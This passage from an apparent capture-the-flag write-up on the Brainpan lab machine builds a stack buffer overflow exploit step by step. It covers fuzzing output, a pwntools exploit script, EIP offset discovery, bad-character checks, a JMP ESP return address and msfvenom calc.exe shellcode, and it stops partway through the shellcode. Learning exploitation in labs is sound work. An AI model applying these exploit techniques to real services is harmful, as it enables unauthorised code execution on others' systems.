</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 192.168.0.14 on port 9999: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sending payload of <span style=color:#ae81ff>400</span> bytes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to 192.168.0.14 port <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 192.168.0.14 on port 9999: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sending payload of <span style=color:#ae81ff>500</span> bytes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Closed connection to 192.168.0.14 port <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 192.168.0.14 on port 9999: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sending payload of <span style=color:#ae81ff>600</span> bytes
</span></span><span style=display:flex><span>Could not connect to 192.168.0.14: <span style=color:#ae81ff>9999</span>
</span></span></code></pre></div><p>Running this script caused a crash with a 600 byte long payload and appeared to confirm my suspicion that this would be a simple overflow due to the instruction pointer (EIP) being overwritten with the value <code>41414141</code> or <code>AAAA</code>. After a few repeats, I could safely assume that the EIP sat at an offset between 500 and 600 bytes off from where the input was stored.</p><p><p class=markdown-image><img src=/images/brainpan_fuzzer_overflow.png alt="fuzzer overflow"></p></p><h4 id=crafting-an-exploit>Crafting an exploit <a href=#crafting-an-exploit class=anchor>üîó</a></h4><p>Having identified the potential for a stack overflow exploit, I decided to switch to a more flexible template script that I could begin refining as I learned more about the brainpan service. I set the total payload size to 1000 signifying 1000 bytes to exploit the 500-600 byte overflow with some overhead for a payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># context vars</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># target</span>
</span></span><span style=display:flex><span>target <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;192.168.0.14&#39;</span>, <span style=color:#ae81ff>9999</span>, typ<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;tcp&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># target-specific vars</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># payload vars</span>
</span></span><span style=display:flex><span>total_payload_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>overflow <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> offset
</span></span><span style=display:flex><span>retn <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>padding <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>bad_chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>  <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>postfix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C&#34;</span> <span style=color:#f92672>*</span> (total_payload_size <span style=color:#f92672>-</span> offset <span style=color:#f92672>-</span> len(retn) <span style=color:#f92672>-</span> len(padding) <span style=color:#f92672>-</span> len(payload))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([
</span></span><span style=display:flex><span>    overflow,
</span></span><span style=display:flex><span>    retn,
</span></span><span style=display:flex><span>    padding,
</span></span><span style=display:flex><span>    payload,
</span></span><span style=display:flex><span>    postfix
</span></span><span style=display:flex><span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># send exploit</span>
</span></span><span style=display:flex><span><span style=color:#75715e># sending payload</span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;&gt;&gt; &#34;</span>)
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;sending payload of </span><span style=color:#e6db74>{</span>len(buffer)<span style=color:#e6db74>}</span><span style=color:#e6db74> bytes&#34;</span>)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>sendline(buffer)
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># cleanup</span>
</span></span><span style=display:flex><span>target<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
</span></span></code></pre></div><h4 id=identifying-the-eip-offset>Identifying the EIP offset <a href=#identifying-the-eip-offset class=anchor>üîó</a></h4><p>Next, I needed to identify the exact offset that began the overflow into the instruction pointer. To better identify this, I then decided to use a cyclical pattern as a payload, which I generated with the metasploit framework&rsquo;s <code>pattern_create.rb</code> script. These work by generating a unique sequence of characters allowing the offset to be derived by the values visible at any location in the payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style=color:#ae81ff>1000</span>
</span></span><span style=display:flex><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
</span></span></code></pre></div><p>I appended this pattern string to the payload in my exploit script like the following.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@00e35ba5ecd5:~# python3 exploit.py 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to 192.168.0.14 on port 9999: Done
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> sending payload of <span style=color:#ae81ff>1000</span> bytes
</span></span></code></pre></div><p>Rerunning the script confirmed again that the EIP was overwritten and using the handy <code>!mona findmsp -distance 1000</code> command in immunity debugger I could easily identify the offset via the unique pattern in the instruction pointer.</p><p><p class=markdown-image><img src=/images/brainpan_mona_findmsp.png alt="mona findmsp"></p></p><p>This showed that the EIP offset was at <code>524</code> bytes so I updated the <code>offset</code> variable in my exploit to reflect this and, additionally, set the <code>retn</code> variable to <code>BBBB</code> to confirm that I could overwrite the EIP with a known value, in this case <code>BBBB</code> or <code>42424242</code>. Rerunning the exploit quickly confirmed this.</p><p><p class=markdown-image><img src=/images/brainpan_overwrite_EIP_with_offset.png alt="overwrite EIP"></p></p><h4 id=identifying-bad-characters>Identifying bad characters <a href=#identifying-bad-characters class=anchor>üîó</a></h4><p>Now that I had control of the EIP, I needed to validate that there were no values, or bad characters, that could cause termination or corruption of the input. I generated a 254-byte array ranging from <code>0x01</code> - <code>0xFF</code> using a short python script. <code>0x00</code> was excluded under the assumption that this was already a &ldquo;bad&rdquo; null termination character.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>256</span>):
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x</span><span style=color:#e6db74>{</span>x<span style=color:#e6db74>:</span><span style=color:#e6db74>02x</span><span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;&#34;</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt; python3 bytearraygen.py 
</span></span><span style=display:flex><span><span style=color:#ae81ff>\x</span>01<span style=color:#ae81ff>\x</span>02<span style=color:#ae81ff>\x</span>03<span style=color:#ae81ff>\x</span>04<span style=color:#ae81ff>\x</span>05<span style=color:#ae81ff>\x</span>06<span style=color:#ae81ff>\x</span>07<span style=color:#ae81ff>\x</span>08<span style=color:#ae81ff>\x</span>09<span style=color:#ae81ff>\x</span>0a<span style=color:#ae81ff>\x</span>0b<span style=color:#ae81ff>\x</span>0c<span style=color:#ae81ff>\x</span>0d<span style=color:#ae81ff>\x</span>0e<span style=color:#ae81ff>\x</span>0f<span style=color:#ae81ff>\x</span>10<span style=color:#ae81ff>\x</span>11<span style=color:#ae81ff>\x</span>12<span style=color:#ae81ff>\x</span>13<span style=color:#ae81ff>\x</span>14<span style=color:#ae81ff>\x</span>15<span style=color:#ae81ff>\x</span>16<span style=color:#ae81ff>\x</span>17<span style=color:#ae81ff>\x</span>18<span style=color:#ae81ff>\x</span>19<span style=color:#ae81ff>\x</span>1a<span style=color:#ae81ff>\x</span>1b<span style=color:#ae81ff>\x</span>1c<span style=color:#ae81ff>\x</span>1d<span style=color:#ae81ff>\x</span>1e<span style=color:#ae81ff>\x</span>1f<span style=color:#ae81ff>\x</span>20<span style=color:#ae81ff>\x</span>21<span style=color:#ae81ff>\x</span>22<span style=color:#ae81ff>\x</span>23<span style=color:#ae81ff>\x</span>24<span style=color:#ae81ff>\x</span>25<span style=color:#ae81ff>\x</span>26<span style=color:#ae81ff>\x</span>27<span style=color:#ae81ff>\x</span>28<span style=color:#ae81ff>\x</span>29<span style=color:#ae81ff>\x</span>2a<span style=color:#ae81ff>\x</span>2b<span style=color:#ae81ff>\x</span>2c<span style=color:#ae81ff>\x</span>2d<span style=color:#ae81ff>\x</span>2e<span style=color:#ae81ff>\x</span>2f<span style=color:#ae81ff>\x</span>30<span style=color:#ae81ff>\x</span>31<span style=color:#ae81ff>\x</span>32<span style=color:#ae81ff>\x</span>33<span style=color:#ae81ff>\x</span>34<span style=color:#ae81ff>\x</span>35<span style=color:#ae81ff>\x</span>36<span style=color:#ae81ff>\x</span>37<span style=color:#ae81ff>\x</span>38<span style=color:#ae81ff>\x</span>39<span style=color:#ae81ff>\x</span>3a<span style=color:#ae81ff>\x</span>3b<span style=color:#ae81ff>\x</span>3c<span style=color:#ae81ff>\x</span>3d<span style=color:#ae81ff>\x</span>3e<span style=color:#ae81ff>\x</span>3f<span style=color:#ae81ff>\x</span>40<span style=color:#ae81ff>\x</span>41<span style=color:#ae81ff>\x</span>42<span style=color:#ae81ff>\x</span>43<span style=color:#ae81ff>\x</span>44<span style=color:#ae81ff>\x</span>45<span style=color:#ae81ff>\x</span>46<span style=color:#ae81ff>\x</span>47<span style=color:#ae81ff>\x</span>48<span style=color:#ae81ff>\x</span>49<span style=color:#ae81ff>\x</span>4a<span style=color:#ae81ff>\x</span>4b<span style=color:#ae81ff>\x</span>4c<span style=color:#ae81ff>\x</span>4d<span style=color:#ae81ff>\x</span>4e<span style=color:#ae81ff>\x</span>4f<span style=color:#ae81ff>\x</span>50<span style=color:#ae81ff>\x</span>51<span style=color:#ae81ff>\x</span>52<span style=color:#ae81ff>\x</span>53<span style=color:#ae81ff>\x</span>54<span style=color:#ae81ff>\x</span>55<span style=color:#ae81ff>\x</span>56<span style=color:#ae81ff>\x</span>57<span style=color:#ae81ff>\x</span>58<span style=color:#ae81ff>\x</span>59<span style=color:#ae81ff>\x</span>5a<span style=color:#ae81ff>\x</span>5b<span style=color:#ae81ff>\x</span>5c<span style=color:#ae81ff>\x</span>5d<span style=color:#ae81ff>\x</span>5e<span style=color:#ae81ff>\x</span>5f<span style=color:#ae81ff>\x</span>60<span style=color:#ae81ff>\x</span>61<span style=color:#ae81ff>\x</span>62<span style=color:#ae81ff>\x</span>63<span style=color:#ae81ff>\x</span>64<span style=color:#ae81ff>\x</span>65<span style=color:#ae81ff>\x</span>66<span style=color:#ae81ff>\x</span>67<span style=color:#ae81ff>\x</span>68<span style=color:#ae81ff>\x</span>69<span style=color:#ae81ff>\x</span>6a<span style=color:#ae81ff>\x</span>6b<span style=color:#ae81ff>\x</span>6c<span style=color:#ae81ff>\x</span>6d<span style=color:#ae81ff>\x</span>6e<span style=color:#ae81ff>\x</span>6f<span style=color:#ae81ff>\x</span>70<span style=color:#ae81ff>\x</span>71<span style=color:#ae81ff>\x</span>72<span style=color:#ae81ff>\x</span>73<span style=color:#ae81ff>\x</span>74<span style=color:#ae81ff>\x</span>75<span style=color:#ae81ff>\x</span>76<span style=color:#ae81ff>\x</span>77<span style=color:#ae81ff>\x</span>78<span style=color:#ae81ff>\x</span>79<span style=color:#ae81ff>\x</span>7a<span style=color:#ae81ff>\x</span>7b<span style=color:#ae81ff>\x</span>7c<span style=color:#ae81ff>\x</span>7d<span style=color:#ae81ff>\x</span>7e<span style=color:#ae81ff>\x</span>7f<span style=color:#ae81ff>\x</span>80<span style=color:#ae81ff>\x</span>81<span style=color:#ae81ff>\x</span>82<span style=color:#ae81ff>\x</span>83<span style=color:#ae81ff>\x</span>84<span style=color:#ae81ff>\x</span>85<span style=color:#ae81ff>\x</span>86<span style=color:#ae81ff>\x</span>87<span style=color:#ae81ff>\x</span>88<span style=color:#ae81ff>\x</span>89<span style=color:#ae81ff>\x</span>8a<span style=color:#ae81ff>\x</span>8b<span style=color:#ae81ff>\x</span>8c<span style=color:#ae81ff>\x</span>8d<span style=color:#ae81ff>\x</span>8e<span style=color:#ae81ff>\x</span>8f<span style=color:#ae81ff>\x</span>90<span style=color:#ae81ff>\x</span>91<span style=color:#ae81ff>\x</span>92<span style=color:#ae81ff>\x</span>93<span style=color:#ae81ff>\x</span>94<span style=color:#ae81ff>\x</span>95<span style=color:#ae81ff>\x</span>96<span style=color:#ae81ff>\x</span>97<span style=color:#ae81ff>\x</span>98<span style=color:#ae81ff>\x</span>99<span style=color:#ae81ff>\x</span>9a<span style=color:#ae81ff>\x</span>9b<span style=color:#ae81ff>\x</span>9c<span style=color:#ae81ff>\x</span>9d<span style=color:#ae81ff>\x</span>9e<span style=color:#ae81ff>\x</span>9f<span style=color:#ae81ff>\x</span>a0<span style=color:#ae81ff>\x</span>a1<span style=color:#ae81ff>\x</span>a2<span style=color:#ae81ff>\x</span>a3<span style=color:#ae81ff>\x</span>a4<span style=color:#ae81ff>\x</span>a5<span style=color:#ae81ff>\x</span>a6<span style=color:#ae81ff>\x</span>a7<span style=color:#ae81ff>\x</span>a8<span style=color:#ae81ff>\x</span>a9<span style=color:#ae81ff>\x</span>aa<span style=color:#ae81ff>\x</span>ab<span style=color:#ae81ff>\x</span>ac<span style=color:#ae81ff>\x</span>ad<span style=color:#ae81ff>\x</span>ae<span style=color:#ae81ff>\x</span>af<span style=color:#ae81ff>\x</span>b0<span style=color:#ae81ff>\x</span>b1<span style=color:#ae81ff>\x</span>b2<span style=color:#ae81ff>\x</span>b3<span style=color:#ae81ff>\x</span>b4<span style=color:#ae81ff>\x</span>b5<span style=color:#ae81ff>\x</span>b6<span style=color:#ae81ff>\x</span>b7<span style=color:#ae81ff>\x</span>b8<span style=color:#ae81ff>\x</span>b9<span style=color:#ae81ff>\x</span>ba<span style=color:#ae81ff>\x</span>bb<span style=color:#ae81ff>\x</span>bc<span style=color:#ae81ff>\x</span>bd<span style=color:#ae81ff>\x</span>be<span style=color:#ae81ff>\x</span>bf<span style=color:#ae81ff>\x</span>c0<span style=color:#ae81ff>\x</span>c1<span style=color:#ae81ff>\x</span>c2<span style=color:#ae81ff>\x</span>c3<span style=color:#ae81ff>\x</span>c4<span style=color:#ae81ff>\x</span>c5<span style=color:#ae81ff>\x</span>c6<span style=color:#ae81ff>\x</span>c7<span style=color:#ae81ff>\x</span>c8<span style=color:#ae81ff>\x</span>c9<span style=color:#ae81ff>\x</span>ca<span style=color:#ae81ff>\x</span>cb<span style=color:#ae81ff>\x</span>cc<span style=color:#ae81ff>\x</span>cd<span style=color:#ae81ff>\x</span>ce<span style=color:#ae81ff>\x</span>cf<span style=color:#ae81ff>\x</span>d0<span style=color:#ae81ff>\x</span>d1<span style=color:#ae81ff>\x</span>d2<span style=color:#ae81ff>\x</span>d3<span style=color:#ae81ff>\x</span>d4<span style=color:#ae81ff>\x</span>d5<span style=color:#ae81ff>\x</span>d6<span style=color:#ae81ff>\x</span>d7<span style=color:#ae81ff>\x</span>d8<span style=color:#ae81ff>\x</span>d9<span style=color:#ae81ff>\x</span>da<span style=color:#ae81ff>\x</span>db<span style=color:#ae81ff>\x</span>dc<span style=color:#ae81ff>\x</span>dd<span style=color:#ae81ff>\x</span>de<span style=color:#ae81ff>\x</span>df<span style=color:#ae81ff>\x</span>e0<span style=color:#ae81ff>\x</span>e1<span style=color:#ae81ff>\x</span>e2<span style=color:#ae81ff>\x</span>e3<span style=color:#ae81ff>\x</span>e4<span style=color:#ae81ff>\x</span>e5<span style=color:#ae81ff>\x</span>e6<span style=color:#ae81ff>\x</span>e7<span style=color:#ae81ff>\x</span>e8<span style=color:#ae81ff>\x</span>e9<span style=color:#ae81ff>\x</span>ea<span style=color:#ae81ff>\x</span>eb<span style=color:#ae81ff>\x</span>ec<span style=color:#ae81ff>\x</span>ed<span style=color:#ae81ff>\x</span>ee<span style=color:#ae81ff>\x</span>ef<span style=color:#ae81ff>\x</span>f0<span style=color:#ae81ff>\x</span>f1<span style=color:#ae81ff>\x</span>f2<span style=color:#ae81ff>\x</span>f3<span style=color:#ae81ff>\x</span>f4<span style=color:#ae81ff>\x</span>f5<span style=color:#ae81ff>\x</span>f6<span style=color:#ae81ff>\x</span>f7<span style=color:#ae81ff>\x</span>f8<span style=color:#ae81ff>\x</span>f9<span style=color:#ae81ff>\x</span>fa<span style=color:#ae81ff>\x</span>fb<span style=color:#ae81ff>\x</span>fc<span style=color:#ae81ff>\x</span>fd<span style=color:#ae81ff>\x</span>fe<span style=color:#ae81ff>\x</span>ff
</span></span></code></pre></div><p>I then replaced the payload in my exploit with the bytearray and reran the exploit. Next I leveraged mona&rsquo;s bytearray command to generate an identical bytearray that I could compare against the contents of the stack, again excluding the null byte.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>!mona bytearray -b <span style=color:#e6db74>&#34;\x00&#34;</span>
</span></span><span style=display:flex><span>!mona compare -f C:<span style=color:#ae81ff>\m</span>ona<span style=color:#ae81ff>\b</span>rainpan<span style=color:#ae81ff>\b</span>ytearray.bin -a 0028F930
</span></span></code></pre></div><p>Running a compare against the address at the stack pointer confirmed that there were no other bad characters.</p><p><p class=markdown-image><img src=/images/brainpan_mona_badchar_comparison.png alt="mona bad_char comparison"></p></p><p>I added the null byte to my <code>bad_chars</code> variable for documentation and cleared the bytearray payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>bad_chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><h4 id=identifying-a-jump-point>Identifying a jump point <a href=#identifying-a-jump-point class=anchor>üîó</a></h4><p>Finally to complete the exploit, I needed a jmp instruction without ASLR/PIE that I could use to hijack command execution. I ran the <code>!mona jmp -r esp -cpb "\x00"</code> command, passing the null byte as a bad char and it quickly identified a single instruction address that I could use <code>0x311712f3</code>. I converted the address to little-endian format to conform to the target&rsquo;s architecture and updated the <code>retn</code> variable in my exploit to point to the jump.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>retn <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf3\x12\x17\x31</span><span style=color:#e6db74>&#34;</span>
</span></span></code></pre></div><h4 id=generating-a-test-payload>Generating a test payload <a href=#generating-a-test-payload class=anchor>üîó</a></h4><p>With all the components to exploit the target in place, I now only needed shellcode to confirm I could get remote code execution on the service. I used msfvenom to create a small payload to run calc.exe. Should everything work successfully, this would cause calc.exe to open on my test environments desktop.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# msfvenom -p windows/exec CMD<span style=color:#f92672>=</span>calc.exe -b <span style=color:#e6db74>&#34;x00&#34;</span> -f python -v payload | sed <span style=color:#e6db74>&#39;s/b&#34;/&#34;/&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style=display:flex><span>Found <span style=color:#ae81ff>11</span> compatible encoders
</span></span><span style=display:flex><span>Attempting to encode payload with <span style=color:#ae81ff>1</span> iterations of x86/shikata_ga_nai
</span></span><span style=display:flex><span>x86/shikata_ga_nai succeeded with size <span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>iteration<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>x86/shikata_ga_nai chosen with final size <span style=color:#ae81ff>220</span>
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>220</span> bytes
</span></span><span style=display:flex><span>Final size of python file: <span style=color:#ae81ff>1180</span> bytes
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>  <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xda\xdf\xd9\x74\x24\xf4\x5b\xba\xea\x73\x0c\xc9&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\x31\xc9\xb1\x31\x83\xc3\x04\x31\x53\x14\x03\x53&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xfe\x91\xf9\x35\x16\xd7\x02\xc6\xe6\xb8\x8b\x23&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xd7\xf8\xe8\x20\x47\xc9\x7b\x64\x6b\xa2\x2e\x9d&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xf8\xc6\xe6\x92\x49\x6c\xd1\x9d\x4a\xdd\x21\xbf&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xc8\x1c\x76\x1f\xf1\xee\x8b\x5e\x36\x12\x61\x32&#34;</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;\xef\x58\xd4\xa3\x84\x15\xe5\x48\xd6\xb8\x6d\xac&#34;</span>
